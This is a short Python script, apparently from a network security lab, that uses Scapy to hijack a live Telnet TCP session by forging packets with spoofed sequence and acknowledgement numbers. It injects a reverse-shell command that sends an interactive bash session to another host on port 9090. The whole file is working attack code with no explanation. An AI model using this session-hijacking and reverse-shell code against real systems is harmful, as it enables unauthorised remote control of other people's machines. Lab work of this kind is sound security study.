#!/usr/bin/env python3
from scapy.all import *

ip = IP(src="10.9.0.6", dst="10.9.0.5")
tcp = TCP(sport=53174, dport=23, flags="PA", seq=332989088, ack=1384920685)
data = "/bin/bash -i > /dev/tcp/10.9.0.1/9090 0<&1 2>&1\r"
for d in data:
    pkt = ip/tcp/d
    pkt.show()
    re = sr1(pkt, timeout=1, verbose=False)
    tcp.seq = re[TCP].ack
    tcp.ack = re[TCP].seq + len(re[Raw].load)
